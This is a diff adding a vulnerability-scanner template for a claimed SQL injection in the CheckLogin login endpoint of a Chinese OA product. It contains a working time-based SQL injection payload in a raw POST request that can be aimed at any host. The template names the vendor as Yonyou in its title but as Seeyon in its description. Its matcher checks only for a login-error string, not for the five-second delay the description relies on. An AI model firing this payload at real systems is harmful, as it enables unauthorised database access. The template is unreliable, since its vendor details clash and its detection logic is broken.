@@ -1,0 +1,24 @@
+id: yonyou-oa-sql-injection
+
+info:
+  name: "用友OA CheckLogin 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    北京致远互联软件股份有限公司开发的OA系统中，CheckLogin接口存在SQL注入漏洞。成功利用该漏洞的攻击者可能获取系统敏感数据。该漏洞的检测通过延时注入方法验证。
+  tags: 用友
+
+http:
+- raw:
+  - |
+    POST /yyoa/CheckLogin HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    userName=11' AND (SELECT 6355 FROM (SELECT(SLEEP(5)))sHcE) AND 'wert'='wert&loginit12=&password=
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '登录名错误'
